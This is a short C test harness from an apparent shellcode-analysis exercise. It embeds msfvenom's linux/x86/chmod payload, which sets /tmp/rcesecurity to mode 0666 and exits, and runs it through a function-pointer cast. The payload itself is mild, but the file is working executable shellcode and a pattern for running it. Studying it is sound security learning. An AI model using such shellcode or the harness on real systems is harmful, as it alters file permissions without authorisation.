/* 
 *  Title:    Msfvenom linux/x86/chmod Analysis
 *  Platform: Linux/x86
 *  Date:     2015-08-13
 *  Author:   Julien Ahrens (@MrTuxracer)
 *  Website:  http://www.rcesecurity.com 
 *
*/

#include <stdio.h>

unsigned char shellcode[] = \
"\x99\x6a\x0f\x58\x52\xe8\x11\x00\x00\x00\x2f\x74\x6d\x70\x2f\x72\x63\x65\x73\x65\x63\x75\x72\x69\x74\x79\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80";

main()
{
	//printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
	int (*ret)() = (int(*)())shellcode;
	ret();
}
